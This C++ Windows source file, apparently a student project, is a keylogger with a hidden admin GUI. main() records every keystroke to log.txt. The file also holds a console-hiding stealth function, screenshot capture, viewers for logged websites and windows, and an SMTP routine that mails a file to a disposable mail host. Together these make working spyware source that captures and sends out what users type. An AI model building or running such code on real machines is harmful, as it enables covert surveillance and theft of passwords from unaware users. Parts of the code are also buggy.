#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#define _WIN32_WINNT 0x501

#include<bits/stdc++.h>
#include<stdio.h>
#include<conio.h>
#include<graphics.h>
#include<windows.h>
#include <windowsx.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <unistd.h>
#include<winuser.h>
#include<string>
#include <winsock2.h>
#include<time.h>
#include <cstdlib>

#define SMTP_PORT "25"
#define DEFAULT_BUFLEN 1024
#define BUFSIZE 800
#define waittime 500
#define cmailserver "gmail-smtp-in.l.google.com"
#define cemailto "bsse1104@iit.du.ac.bd"
#define cemailfrom "dynamicsiam01@gmail.com"
#define LogLength 100
#define SMTPLog "smtp.log"
#define cemailsubject "Interesting Mail"
#define cemailmessage "Hello! I am here. That's a fun mail"

#define MAX_INPUT_LEN 80
using namespace std;

void viewOptions();
bool authentication_ret(char*, char*);
void authentication();
int ssCount = 10;
char recipients_mail[80];




bool authentication_ret(char takenName[], char takenPass[])
{
    FILE *fp;
    bool flag= false;
    fp = fopen ("authorised_users.txt","r");
    char nameOnFile[80], passOnFile[16];

    while(fgets(nameOnFile,80,fp)!=NULL)
    {
        fgets(passOnFile,80,fp);
        int size1= strlen(nameOnFile);

        nameOnFile[size1-1]='\0';
        int size2= strlen(passOnFile);
        passOnFile[size2-1]='\0';
        std::cout<< "name : "<< nameOnFile<< " pass: "<< passOnFile<<std::endl;
        if(strcmp(nameOnFile,takenName)==0 && strcmp(passOnFile,takenPass)==0)
        {
            //printf("successful");
            flag = true;

        }
        if(fp==NULL)
        {
            std::cout<< "breaking"<<std::endl;
            break;
        }
    }
    fclose(fp);
    std::cout<< "false"<<std::endl;
    return flag;

}

void mailingGraph()
{
    DWORD screenWidth= GetSystemMetrics(SM_CXSCREEN);
    DWORD screenHeight = GetSystemMetrics(SM_CYSCREEN);
    initwindow(screenWidth,screenHeight,"Add user");
    setcolor(WHITE);

    char s[]= "siam";
    //FILE *fp = fopen("authorised_users.txt","a");


    settextstyle(3, HORIZ_DIR, 5);
    setbkcolor(BLUE);
    setcolor(YELLOW);
    outtextxy(400,100, "Give the Following Info to Add user");

    setbkcolor(BLACK);
    setcolor(WHITE);
    settextstyle(8,HORIZ_DIR,3);
    outtextxy(200,260,"EMAIL");
    rectangle(400,250,800,290);
    settextstyle(6,HORIZ_DIR,4);
    setbkcolor(7);
    setcolor(BLACK);
    rectangle(550,450,700,500);
    outtextxy(600,460,"MAIL");
    rectangle(1000,450,1200,500);
    settextstyle(BOLD_FONT,HORIZ_DIR,4);
    setcolor(RED);
    outtextxy(1050,460,"Cancel");
    char c;
    char inputbuf[MAX_INPUT_LEN]="";
    int input_pos = 0;
    int the_end = 0;
    do
    {
        settextstyle(1,HORIZ_DIR,3);
        outtextxy (410,260, inputbuf);
        c = getch();
        switch (c)
        {
            case 8: /* backspace */
            if (input_pos)
            {
                input_pos--;
                inputbuf[input_pos] = ' ';
            }
            break;
            case 13: /* return */
                the_end = 1;
                break;
            case 27: /* Escape = Abort */
                inputbuf[0] = 0;
                the_end = 1;
                break;
            default:
                if (input_pos < MAX_INPUT_LEN-1 && c >= ' ' && c <= '~')
                {
                    inputbuf[input_pos] = c;
                    input_pos++;
                    inputbuf[input_pos] = ' ';
                }
        }
    } while (!the_end);
    char email[80];
    strcpy(email,inputbuf);
    strcpy(recipients_mail, email);
    POINT position;
    int count=0;
    printf("Your email: %s",email);
    while(1)
    {
        if(GetKeyState(VK_LBUTTON)&0x8000)
        {

            GetCursorPos(&position);
            printf("\n now point is %d %d",position.x,position.y);
            count++;
        }
        if(count==2) break;
    }
    int x = position.x;
    int y = position.y;
    if(x>=550&&x<=700&&y>=450&&y<=600)
    {

        int height=300,width=700;
        initwindow(width,height,"Authentication Failed",500,350);
        settextstyle(8,HORIZ_DIR,3);
        outtextxy(100,100,"Mailed! Redirecting to Options...");
        delay(5000);
        closegraph();
        viewOptions();
    }
    else if(x>=1000&&x<=1200&&y>=450&&y<=600)
    {
        closegraph();
        viewOptions();
    }


}

void viewBrowsedWebsites()
{
    int screenWidth= GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    initwindow(screenWidth,screenHeight,"View website");
    setcolor(WHITE);
    char s[]= "siam";
    FILE *fp = fopen("browsed_websites.txt","r");
    char web[100][100];
    int i=0;
    while(fgets(web[i],100,fp)!=0)
    {
        i++;
    }
    int x =200;
    int y1=25,y2=75;
        int y=50;
    for(int j=0;j<i;j++)
    {
        rectangle(180,y1,500,y2);
        outtextxy(x,y, web[j]);
        y = y+50;
        y1+=50;
        y2+=50;

    }
    rectangle(1000,550,1200,600);
    settextstyle(BOLD_FONT,HORIZ_DIR,3);
    setcolor(YELLOW);
    outtextxy(1050,570,"BACK");
    POINT position;
    int xx,yy;
    int count=0;
    while(1)
    {
        if(GetKeyState(VK_LBUTTON)&0x8000)
        {

            GetCursorPos(&position);
            printf("\n now point is %d %d",position.x,position.y);
            count++;
        }
        if(count==2) break;
    }
    xx=position.x;
    yy=position.y;
    if(xx>=1000&&xx<=1200 && yy>=550&&yy<=700)
    {
        closegraph();
        delay(500);
        viewOptions();
    }
    //closegraph();


}


void addUser()
{
    DWORD screenWidth= GetSystemMetrics(SM_CXSCREEN);
    DWORD screenHeight = GetSystemMetrics(SM_CYSCREEN);
    initwindow(screenWidth,screenHeight,"Add user");
    setcolor(WHITE);

    char s[]= "siam";
    //FILE *fp = fopen("authorised_users.txt","a");


    settextstyle(3, HORIZ_DIR, 5);
    setbkcolor(BLUE);
    setcolor(YELLOW);
    outtextxy(400,100, "Give the Following Info to Add user");

    setbkcolor(BLACK);
    setcolor(WHITE);
    settextstyle(8,HORIZ_DIR,3);
    outtextxy(200,260,"USER NAME");
    rectangle(400,250,800,290);

    outtextxy(200,360,"PASSWORD");
    rectangle(400,350,800,390);

    settextstyle(6,HORIZ_DIR,4);
    setbkcolor(7);
    setcolor(BLACK);
    rectangle(550,450,700,500);
    outtextxy(600,460,"ADD");
    rectangle(1000,550,1200,600);
    settextstyle(BOLD_FONT,HORIZ_DIR,3);
    setcolor(RED);
    outtextxy(1050,570,"Cancel");

    char c;
    char inputbuf[MAX_INPUT_LEN]="";
    int input_pos = 0;
    int the_end = 0;
    do
    {
        settextstyle(1,HORIZ_DIR,3);
        outtextxy (410,260, inputbuf);
        c = getch();
        switch (c)
        {
            case 8: /* backspace */
            if (input_pos)
            {
                input_pos--;
                inputbuf[input_pos] = ' ';
            }
            break;
            case 13: /* return */
                the_end = 1;
                break;
            case 27: /* Escape = Abort */
                inputbuf[0] = 0;
                the_end = 1;
                break;
            default:
                if (input_pos < MAX_INPUT_LEN-1 && c >= ' ' && c <= '~')
                {
                    inputbuf[input_pos] = c;
                    input_pos++;
                    inputbuf[input_pos] = ' ';
                }
        }
    } while (!the_end);
    char name[80];
    strcpy(name,inputbuf);
    printf("Your name: %s",name);

    input_pos=0;
    char passInput[16]="";
    the_end=0;
    do
    {
        settextstyle(1,HORIZ_DIR,3);
        outtextxy (410,360, passInput);
        c = getch();
        switch (c)
        {
            case 8: /* backspace */
            if (input_pos)
            {
                input_pos--;
                passInput[input_pos] = ' ';
            }
            break;
            case 13: /* return */
                the_end = 1;
                break;
            case 27: /* Escape = Abort */
                passInput[0] = 0;
                the_end = 1;
                break;
            default:
                if (input_pos < 15 && c >= ' ' && c <= '~')
                {
                    passInput[input_pos] = c;
                    input_pos++;
                    passInput[input_pos] = 0;
                }
        }
    } while (!the_end);
    char password[80];
    strcpy(password,passInput);
    printf("\nYour password: %s",password);


    //delay(500);'
    //fflush(stdin);
    POINT position;
    int count=0;
    //getch();
    while(1)
    {
        if(GetKeyState(VK_LBUTTON)&0x8000)
        {

            GetCursorPos(&position);
            printf("\n now point is %d %d",position.x,position.y);
            count++;
        }
        if(count==2) break;
    }
    int x,y;
    x = position.x;
    y = position.y;
    if(x>=550&&x<=700&&y>=450&&y<=550)
    {
        std::cout<< "hi"<<std::endl;
        FILE *addUserFP = fopen("authorised_users.txt","a");
        fputs(name, addUserFP);
        //fputs("\n",addUserFP);
        fputs(password, addUserFP);
        //fputs("\n",addUserFP);
        fclose(addUserFP);
        DWORD screenWidth2= 500;
        DWORD screenHeight2 = 350;
        initwindow(screenWidth,screenHeight,"User Added Successfully");
        setcolor(WHITE);
        settextstyle(3, HORIZ_DIR, 5);
        setbkcolor(BLUE);
        setcolor(YELLOW);
        //setbkcolor(BLUE);
        //setcolor(BLUE);
        outtextxy(400,100, "User added successfully!");
        delay(3000);
        closegraph();
        viewOptions();
    }
   // 1000,550,1200,600
    if(x>=1000&&x<=1200 && y>=550&&y<=700)
    {
        closegraph();
        delay(500);
        viewOptions();
    }

}

void viewWindows()
{
    int screenWidth= GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    initwindow(screenWidth,screenHeight,"View website");
    setcolor(WHITE);
    char s[]= "siam";
    FILE *fp = fopen("windows.txt","r");
    char web[100][100];
    int i=0;
    while(fgets(web[i],100,fp)!=0)
    {
        i++;
    }
    int x =200;
    int y1=25,y2=75;
        int y=50;
    for(int j=0;j<i;j++)
    {
        rectangle(180,y1,500,y2);
        outtextxy(x,y, web[j]);
        y = y+50;
        y1+=50;
        y2+=50;

    }
    rectangle(1000,550,1200,600);
    settextstyle(BOLD_FONT,HORIZ_DIR,3);
    setcolor(YELLOW);
    outtextxy(1050,570,"BACK");
    POINT position;
    int xx,yy;
    int count=0;
    while(1)
    {
        if(GetKeyState(VK_LBUTTON)&0x8000)
        {

            GetCursorPos(&position);
            printf("\n now point is %d %d",position.x,position.y);
            count++;
        }
        if(count==2) break;
    }
    xx=position.x;
    yy=position.y;
    if(xx>=1000&&xx<=1200 && yy>=550&&yy<=700)
    {
        closegraph();
        delay(500);
        viewOptions();
    }
    //closegraph();

}

void viewSS()
{
    printf("1");
    int variable=1;
    char nameOfScreenshot[20];
    snprintf(nameOfScreenshot, 20, "image%d.bmp", variable); // puts string into buffer
    printf("%s\n", nameOfScreenshot);
    variable++;
    initwindow(1200,900, nameOfScreenshot,500,150);
    readimagefile(nameOfScreenshot,0,0,1200,900);
    while(variable<=ssCount)
    {
        if(kbhit())
        {
            nameOfScreenshot[20];
            snprintf(nameOfScreenshot, 20, "image%d.bmp", variable); // puts string into buffer
            printf("%s\n", nameOfScreenshot);
            variable++;
            initwindow(1200,900, nameOfScreenshot,500,150);
            readimagefile(nameOfScreenshot,0,0,1200,900);
        }
    }
    viewOptions();
}

void viewOptions()
{
    int heightOfScreen = GetSystemMetrics(SM_CXSCREEN);
    int widthOfScreen = GetSystemMetrics(SM_CYSCREEN);
    int gd = DETECT;
    int gm;
    initwindow(heightOfScreen,widthOfScreen,"Options",-3,-3);
    settextstyle(BOLD_FONT,HORIZ_DIR,5);


    setcolor(2);
    //rectangle(500,100,900,200);
    outtextxy(500,130,"Welcome to the system!");
    setcolor(3);
    settextstyle(BOLD_FONT,HORIZ_DIR,3);
    //setcolor(RED);
    //outtextxy(1050,570,"EXIT");
    rectangle(100,400,300,450);
    outtextxy(150,420,"HISTORY");
    rectangle(400,400,600,450);
    outtextxy(450,420,"ADD USER");
    rectangle(700,400,900,450);
    outtextxy(750,420,"MAIL");
    rectangle(1000,400,1200,450);
    outtextxy(1020,420,"SCREENSHOTS");
    rectangle(700,550,900,600);
    outtextxy(750,570,"WINDOWS");
    rectangle(1000,550,1200,600);
    setcolor(RED);
    outtextxy(1050,570,"EXIT");
    int count=0;
    //getch();
    delay(500);
    POINT position;
    bool flag=false;
    std::cout<< "options"<<std::endl;
    while(1)
    {
        if(!flag) std::cout<< "in"<<std::endl;
        flag=true;
        if(GetKeyState(VK_LBUTTON)&0x8000)
        {

            GetCursorPos(&position);
            printf("\n now point is %d %d",position.x,position.y);
            count++;
        }
        if(count==2) break;
    }
    int x,y;
    x = position.x;
    y = position.y;
    if(x>=100 && x<=300 && y>=400 && y<=470)
    {
        closegraph();
        delay(500);
        viewBrowsedWebsites();
    }

    if(x>=400 && x<=600 && y>=400 && y<=470)
    {
        closegraph();
        delay(500);
        addUser();
    }

    if(x>=700 && x<=900 && y>=400 && y<=470)
    {
        closegraph();
        delay(500);
        mailingGraph();
    }

    if(x>=1000 && x<=1200 && y>=400 && y<=470)
    {
        closegraph();
        delay(500);
        viewSS();
    }

    if(x>=1000 && x<=1200 && y>=550 && y<=650)
    {
        //closegraph();
        int height=300,width=700;
        initwindow(width,height,"Exiting",200,200);
        settextstyle(8,HORIZ_DIR,3);
        outtextxy(100,100,"THANK YOU FOR USING THE SYSTEM...");
        delay(5000);
        closegraph();
        authentication();
    }
    if(x>=700 && x<=900 && y>=550 && y<=650)
    {
        closegraph();
        delay(500);
        viewWindows();
    }

    getch();
    closegraph();
}

void authentication()
{
    int height=500,width=700;

    initwindow(width,height,"Authenticate",500,300);
    setfillstyle(1,8);
    bar(0,0,width,height);

    setfillstyle(1,7);
    bar(width/2-100,100,width/2+100,height-100);

    settextstyle(3, HORIZ_DIR, 3);
    int textWidth = textwidth("LOG IN");
    setbkcolor(7);
    setcolor(2);
    outtextxy(width/2-textWidth/2,120,"LOG IN");

    settextstyle(8,HORIZ_DIR,1);
    outtextxy(width/2-90,160,"USER NAME");
    rectangle(width/2-90,185,width/2+90,205);

    outtextxy(width/2-90,210,"PASSWORD");
    int textHeight = textheight("PASSWORD");
    rectangle(width/2-90,215+textHeight,width/2+90,215+textHeight+20);

    settextstyle(6,HORIZ_DIR,1);
    int textWidth2 = textwidth("SIGN IN");

    rectangle(width/2-80,300,width/2+80,340);
    outtextxy(width/2-textWidth2/2,310,"SIGN IN");

    char c;
    char inputbuf[MAX_INPUT_LEN]="";
    int input_pos = 0;
    int the_end = 0;
    do
    {
        settextstyle(1,HORIZ_DIR,2);
        outtextxy (width/2-90,185, inputbuf);
        c = getch();
        switch (c)
        {
            case 8: /* backspace */
            if (input_pos)
            {
                input_pos--;
                inputbuf[input_pos] = ' ';
            }
            break;
            case 13: /* return */
                the_end = 1;
                break;
            case 27: /* Escape = Abort */
                inputbuf[0] = 0;
                the_end = 1;
                break;
            default:
                if (input_pos < MAX_INPUT_LEN-1 && c >= ' ' && c <= '~')
                {
                    inputbuf[input_pos] = c;int screenWidth= GetSystemMetrics(SM_CXSCREEN);


                    input_pos++;
                    inputbuf[input_pos] = ' ';
                }int screenWidth= GetSystemMetrics(SM_CXSCREEN);

        }
    } while (!the_end);
    char email[80];
    strcpy(email,inputbuf);
    printf("Your email: %s",email);

    input_pos=0;
    char passInput[16]="";
    the_end=0;
    do
    {
        settextstyle(1,HORIZ_DIR,2);
        outtextxy (width/2-90,215+textHeight, passInput);
        c = getch();
        switch (c)
        {
            case 8: /* backspace */
            if (input_pos)
            {
                input_pos--;
                passInput[input_pos] = ' ';
            }
            break;
            case 13: /* return */
                the_end = 1;
                break;
            case 27: /* Escape = Abort */
                passInput[0] = 0;
                the_end = 1;
                break;
            default:
                if (input_pos < 15 && c >= ' ' && c <= '~')
                {
                    passInput[input_pos] = c;
                    input_pos++;
                    passInput[input_pos] = 0;
                }
        }
    } while (!the_end);
    char password[80];
    strcpy(password,passInput);
    printf("\nYour password: %s",password);

    bool authenticate;
    int size = strlen(email);
    email[size-1]='\0';


    POINT check;
    int count=0;
    while(1)
    {

        if(GetAsyncKeyState(VK_LBUTTON)&0x8000)
        {
            printf("\nPRESSED");
            GetCursorPos(&check);
            count++;
        }
        if(count==1) break;
    }

    int x,y;
    x = check.x;
    y = check.y;
    printf("1. %d %d\n", x,y);
    if(x>=730&&x<=950 && y>=600&&y<=670)
    {
        authenticate = authentication_ret(email, password);
        printf("\nvalue returned: %d\n",authenticate);
        if(authenticate==true)
        {
            std::cout<< "\nauthenticated\n";
            closegraph();
            delay(500);
            viewOptions();
        }
        else
        {
            std::cout<< "\nauthentication failed\n";
            //delay(500);

            int height=300,width=700;
            initwindow(width,height,"Authentication Failed",500,350);
            setcolor(RED);
            settextstyle(8,HORIZ_DIR,3);
            outtextxy(100,100,"Authentication Failed! Retry...");
            delay(5000);
            closegraph();
            authentication();
            //closegraph();
            // authenticationFailed();
        }
    }
}


int GetFilePointer(HANDLE FileHandle)
{
    return SetFilePointer(FileHandle, 0, 0, FILE_CURRENT);
}

bool SaveBMPFile(char *filename, HBITMAP bitmap, HDC bitmapDC, int width, int height)
{
    HBITMAP offScreenBitmap=NULL;
    HDC offScreenDeviceContext=NULL;
    LPBITMAPINFO bitMapFormatInfo=NULL;
    LPVOID lpvBits=NULL;
    HANDLE BmpFile=INVALID_HANDLE_VALUE;
    BITMAPFILEHEADER bmfh;


    if ((offScreenBitmap = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
        return false;

    if ((offScreenDeviceContext = CreateCompatibleDC(bitmapDC)) == NULL)
        return false;
    HBITMAP OldBmp = (HBITMAP)SelectObject(offScreenDeviceContext, offScreenBitmap);
    BitBlt(offScreenDeviceContext, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
    if ((bitMapFormatInfo = (LPBITMAPINFO)(new char[sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD)])) == NULL)
        return false;


    ZeroMemory(&bitMapFormatInfo->bmiHeader, sizeof(BITMAPINFOHEADER));
    bitMapFormatInfo->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    SelectObject(offScreenDeviceContext, OldBmp);
    if (!GetDIBits(offScreenDeviceContext, offScreenBitmap, 0, height, NULL, bitMapFormatInfo, DIB_RGB_COLORS))
        return false;
    if ((lpvBits = new char[bitMapFormatInfo->bmiHeader.biSizeImage]) == NULL)
        return false;
    if (!GetDIBits(offScreenDeviceContext, offScreenBitmap, 0, height, lpvBits, bitMapFormatInfo, DIB_RGB_COLORS))
        return false;
    if ((BmpFile = CreateFile(filename,GENERIC_WRITE,0, NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
        return false;

    DWORD Written;
    bmfh.bfType = 19778;
    bmfh.bfReserved1 = bmfh.bfReserved2 = 0;
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return false;

    if (Written < sizeof(bmfh))
        return false;
    if (!WriteFile(BmpFile, &bitMapFormatInfo->bmiHeader, sizeof(BITMAPINFOHEADER), &Written, NULL))
        return false;

    if (Written < sizeof(BITMAPINFOHEADER))
        return false;
    int PalEntries;

    if (bitMapFormatInfo->bmiHeader.biCompression == BI_BITFIELDS)
        PalEntries = 3;
    else

        PalEntries = (bitMapFormatInfo->bmiHeader.biBitCount <= 8) ? // bitmap is palettized?
                     // 2^biBitCount palette entries max.:
                     (int)(1 << bitMapFormatInfo->bmiHeader.biBitCount)
                     // bitmap is TrueColor -> no palette:
                     : 0;
    if(bitMapFormatInfo->bmiHeader.biClrUsed)
        PalEntries = bitMapFormatInfo->bmiHeader.biClrUsed;
    if(PalEntries)
    {
        if (!WriteFile(BmpFile, &bitMapFormatInfo->bmiColors, PalEntries * sizeof(RGBQUAD), &Written, NULL))
            return false;

        if (Written < PalEntries * sizeof(RGBQUAD))
            return false;
    }
    bmfh.bfOffBits = GetFilePointer(BmpFile);

    // Write bitmap bits to the file:
    if (!WriteFile(BmpFile, lpvBits, bitMapFormatInfo->bmiHeader.biSizeImage, &Written, NULL))
        return false;

    if (Written < bitMapFormatInfo->bmiHeader.biSizeImage)
        return false;
    bmfh.bfSize = GetFilePointer(BmpFile); // The current pos. in the file is the final file size and will be saved:

    // We have all the info for the file header. Save the updated version:
    SetFilePointer(BmpFile, 0, 0, FILE_BEGIN);
    if (!WriteFile(BmpFile, &bmfh, sizeof(bmfh), &Written, NULL))
        return false;

    if (Written < sizeof(bmfh))
        return false;
    CloseHandle(BmpFile);
    return true;
}

bool ScreenCapture(int x, int y, int width, int height, char *filename)
{
    HDC hDc = CreateCompatibleDC(0);
    HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
    SelectObject(hDc, hBmp);
    BitBlt(hDc, 0, 0, width, height, GetDC(0), x, y, SRCCOPY);
    bool value = SaveBMPFile(filename, hBmp, hDc, width, height);
    DeleteObject(hBmp);
    return value;
}

int sendData(SOCKET* socket, const char* data)
{
    int iResult;
    printf("%s", data);
    iResult = send(*socket, data, (int)strlen(data), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed (msg: %s): %d\n", data, WSAGetLastError());
    }
    return iResult;
}

void recvData(SOCKET* socket)
{
    int recvbuflen = DEFAULT_BUFLEN;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    iResult = recv(*socket, recvbuf, recvbuflen - 1, 0);
    printf("In recvData function: %d\n", iResult);
    if (iResult > 0) {
        recvbuf[iResult] = '\0';
        printf("%s", recvbuf);
    }
    else if (iResult == 0)
        printf("Connection closed\n");
    else
        printf("recv failed: %d\n", WSAGetLastError());
}

int mailMyLog(char *mailserver, char *emailto, char *emailfrom, char *emailsubject, char *emailmessage) {

    WSADATA wsaData;

    int iResult;
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }

    struct addrinfo *result = NULL;
    struct addrinfo *ptr = NULL;
    struct addrinfo hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo("mail.sharklasers.com", SMTP_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    SOCKET ConnectSocket = INVALID_SOCKET;
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }
        printf("ekhane eshechi\n");

        cout<<ConnectSocket<< " "<< ptr->ai_addr << " "<< (int)ptr->ai_addrlen<<endl;
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        cout<< iResult<<endl;
        cout<< WSAGetLastError()<<endl;
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            printf("error detected\n");
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        printf(" %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    sendData(&ConnectSocket, "HELO mail.sharklasers.com\r\n");
    recvData(&ConnectSocket);
    sendData(&ConnectSocket, "MAIL FROM:<psgibrxp@sharklasers.com>\r\n");
    recvData(&ConnectSocket);
    sendData(&ConnectSocket, "RCPT TO:<psgibrxp@sharklasers.com>\r\n");
    recvData(&ConnectSocket);
    sendData(&ConnectSocket, "DATA\r\n");
    recvData(&ConnectSocket);
    sendData(&ConnectSocket, "Subject:This is subject of my mail\r\n");
    sendData(&ConnectSocket, "And this is text\r\n");
    sendData(&ConnectSocket, "MIME-Version: 1.0\r\n");
    sendData(&ConnectSocket, "Content-Type:multipart/mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
    sendData(&ConnectSocket, "Subject:This is subject of my mail\r\n");
    sendData(&ConnectSocket, "\r\n"); /* added */
    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
    sendData(&ConnectSocket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
    sendData(&ConnectSocket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
    sendData(&ConnectSocket, "Hi Siam,=0A=0AThis is an empty file.=0A=0ARegards,=0A<ME>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
    sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
    sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"test.cpp\"\r\n\r\n");
    sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
    sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
    sendData(&ConnectSocket, ".\r\n");

    FILE* MailFilePtr = fopen("test.cpp", "r");
    if (MailFilePtr == NULL)
        printf("Error opening attachment\n");

    char FileBuffer[1024];
    char buf[1024];

    memset(FileBuffer, 0, sizeof(FileBuffer));
    while (fgets(FileBuffer, sizeof(FileBuffer), MailFilePtr))
    {
        sprintf(buf, "%s", FileBuffer);
        buf[strlen(buf) - 1] = 0;
        sendData(&ConnectSocket, buf);
        memset(FileBuffer, 0, sizeof(FileBuffer));
        memset(buf, 0, sizeof(buf));
    }

    fclose(MailFilePtr);

    sendData(&ConnectSocket, "\r\n\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq--\r\n\r\n");
    sendData(&ConnectSocket, ".\r\n");
    recvData(&ConnectSocket);

    sendData(&ConnectSocket, "QUIT\r\n");

    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    closesocket(ConnectSocket);
    WSACleanup();
    return 0;
}

void stealth()
{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth,0);

}

int save(int _key, char const *file)
{
    cout << _key << endl;
    Sleep(10);
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen (file,"a+");
    if( _key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if( _key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
    else if( _key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
    else if( _key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if( _key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
    else if( _key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if( _key == VK_RBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
    else if( _key == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
    else if( _key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if( _key == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP_ARROW]");
    else if( _key == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN_ARROW]");
    else if( _key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT_ARROW]");
    else if( _key == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT_ARROW]");
    else if( _key == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CTRL]");
    else if( _key == 190)
        fprintf(OUTPUT_FILE, "%s", ".");
    else
        fprintf(OUTPUT_FILE,"%s", &_key);
    fclose(OUTPUT_FILE);
    return 0;
}


int main()
{
    //stealth();
    short i;
    while(1)
    {
        //Sleep(10);
        for(i=8;i<192;i++)
        {
            if((GetAsyncKeyState(VK_SHIFT)&0x80000) && (GetAsyncKeyState(VK_CONTROL)&0x80000) && (GetAsyncKeyState(VK_TAB)&0x80000))
                    authentication();
            if(GetAsyncKeyState(i)==-32767)
            {
                save(i,"log.txt");
            }
        }
        system("PAUSE");
    }
   // Sleep(10);
    viewOptions();
    cout<< "siam"<<endl;
}
